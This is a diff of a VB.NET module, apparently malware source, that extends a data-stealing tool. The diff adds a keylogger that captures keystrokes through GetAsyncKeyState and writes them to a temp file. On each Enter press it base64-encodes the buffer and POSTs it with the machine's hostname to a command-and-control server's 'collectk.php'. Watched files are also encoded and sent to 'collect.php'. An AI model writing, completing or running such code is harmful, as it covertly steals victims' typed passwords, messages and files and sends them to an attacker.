@@ -1,12 +1,11 @@
-﻿Imports System
-Imports System.Diagnostics
-Imports System.Security.Principal
+﻿Imports System.Security.Principal
 Imports System.IO
 Imports System.Threading
 Imports System.Security.Cryptography
 Imports System.Net
 Imports System.Text
-'Imports System.Runtime.InteropServices
+Imports System.Windows.Forms 'add 
+
 
 Module Module1
 
@@ -175,6 +174,10 @@ Module Module1
 
 
 
+
+
+
+
         ' start monitoring
         w.EnableRaisingEvents = True
 
@@ -184,6 +187,12 @@ Module Module1
         '************************************************************************************
 
         w.EnableRaisingEvents = False
+
+
+
+
+
+
 
     End Sub
 
@@ -313,18 +322,18 @@ Module Module1
                 End If
             Finally
                 Dim md5hash As String = get_md5(f)
-                Dim base64text As String = get_base64(f)
+                Dim base64text As String = get_base64_from_file(f)
 
                 Select Case id
                     Case 1
                         scrivi_evento("File: " & f & vbCrLf & "MD5: " & md5hash & vbCrLf & "Code: " & base64text, 269)
-                        invia_to_c2(base64text, 269, md5hash, f)
+                        invia_to_c2(base64text, 269, md5hash, f, "", "L")
                     Case 2
                         scrivi_evento("File: " & f & vbCrLf & "MD5: " & md5hash & vbCrLf & "Code: " & base64text, 169)
-                        invia_to_c2(base64text, 169, md5hash, f)
+                        invia_to_c2(base64text, 169, md5hash, f, "", "L")
                     Case 3
                         scrivi_evento("File: " & f & vbCrLf & "MD5: " & md5hash & vbCrLf & "Code: " & base64text, 369)
-                        invia_to_c2(base64text, 369, md5hash, f)
+                        invia_to_c2(base64text, 369, md5hash, f, "", "L")
                 End Select
             End Try
 
@@ -335,11 +344,18 @@ Module Module1
 
     End Sub
 
-    Function get_base64(f As String) As String
+    Function get_base64_from_file(f As String) As String
         Try
-            get_base64 = Convert.ToBase64String(System.IO.File.ReadAllBytes(f))
+            get_base64_from_file = Convert.ToBase64String(System.IO.File.ReadAllBytes(f))
         Catch
-            get_base64 = "-"
+            get_base64_from_file = "LQ==" ' -
+        End Try
+    End Function
+    Function get_base64_from_string(s As String) As String
+        Try
+            get_base64_from_string = Convert.ToBase64String(Encoding.ASCII.GetBytes(s))
+        Catch
+            get_base64_from_string = "LQ==" ' -
         End Try
     End Function
     Function get_md5(f As String) As String
@@ -431,16 +447,30 @@ Module Module1
     End Function
 
 
-    Sub invia_to_c2(b As String, i As String, h As String, f As String)
+    Sub invia_to_c2(b As String, i As String, h As String, f As String, k As String, func As String)
         'b as base64
         'i as id log
         'h as hash
         'f as file name
+        'k as keylog buffer
         If Not Mid(c.url_c2, 1, 1) = "#" Then
 
+
             Try
-                Dim request As WebRequest = WebRequest.Create(c.url_c2)
-                Dim postData As String = "id_log=" & i & "&b64=" & b & "&hash=" & h & "&file_name=" & WebUtility.HtmlEncode(f.Replace("\", "\\"))
+                Dim request As WebRequest
+                Dim postData As String = ""
+
+                Select Case func
+                    Case "L" 'upload log
+                        request = WebRequest.Create(c.url_c2 & "collect.php")
+                        postData = "id_log=" & i & "&b64=" & b & "&hash=" & h & "&file_name=" & WebUtility.HtmlEncode(f.Replace("\", "\\"))
+                    Case "K" 'upload keylogger
+                        request = WebRequest.Create(c.url_c2 & "collectk.php")
+                        postData = "keylog_buffer=" & k & "&hostname=" & My.Computer.Name 'base64 encode
+                    Case Else
+                        Exit Sub
+                End Select
+
                 Dim byteArray As Byte() = Encoding.UTF8.GetBytes(postData)
 
                 request.Method = "POST"
@@ -455,6 +485,7 @@ Module Module1
                 Using inStream As Stream = response.GetResponseStream()
                     Dim reader As New StreamReader(inStream)
                     Dim responseFromServer As String = reader.ReadToEnd()
+
 
                     log_locale("[+] Data sent to C2: " & responseFromServer)
                 End Using
@@ -472,29 +503,54 @@ Module Module1
     '------------------------------------------------------------------------------------------
 
     Sub avvia_keylogger()
-
         Dim td As Thread
         td = New Thread(AddressOf keylogger)
         td.Start()
         'td.Join()
-
     End Sub
     Sub keylogger()
 
+        Dim k As New Keys 'system.windows.forms
         While True
-            For i = 65 To 128
-                If GetAsyncKeyState(i) = -32767 Then
-                    keylogger_scrivi(Chr(i))
-                End If
-            Next i
+
+            If GetAsyncKeyState(k.Return) = -32767 Then
+                keylogger_scrivi("[Enter]")
+                keylogger_send_c2() 'when ir press enter
+            ElseIf GetAsyncKeyState(k.Space) = -32767 Then
+                keylogger_scrivi("[Space]")
+            ElseIf GetAsyncKeyState(k.Back) = -32767 Then
+                keylogger_scrivi("[Backspace]")
+            ElseIf GetAsyncKeyState(k.LShiftKey) = -32767 Then
+                keylogger_scrivi("[LShift]")
+            Else
+                For i = 33 To 127
+                    If GetAsyncKeyState(i) = -32767 Then keylogger_scrivi(Chr(i))
+                Next i
+            End If
         End While
 
     End Sub
 
     Sub keylogger_scrivi(b As String)
-        Dim f As New StreamWriter("./keylog.txt", append:=True)
+        Dim f As New StreamWriter(verifica_path(Directory.GetCurrentDirectory) & "keylog_temp.txt", append:=True)
         f.Write(b)
         f.Close()
+    End Sub
+
+    Sub keylogger_send_c2()
+        'send to c2 only when return is pressed - update on db
+        If verifica_free(verifica_path(Directory.GetCurrentDirectory) & "keylog_temp.txt") Then
+            Dim f As New StreamReader(verifica_path(Directory.GetCurrentDirectory) & "keylog_temp.txt")
+            Dim s As String = f.ReadToEnd
+            f.Close()
+            Dim k As String = get_base64_from_string(s)
+            'Dim k As String = f.ReadToEnd
+
+
+            invia_to_c2("", 0, "", "", k, "K")
+        End If
+
+
     End Sub
 
 
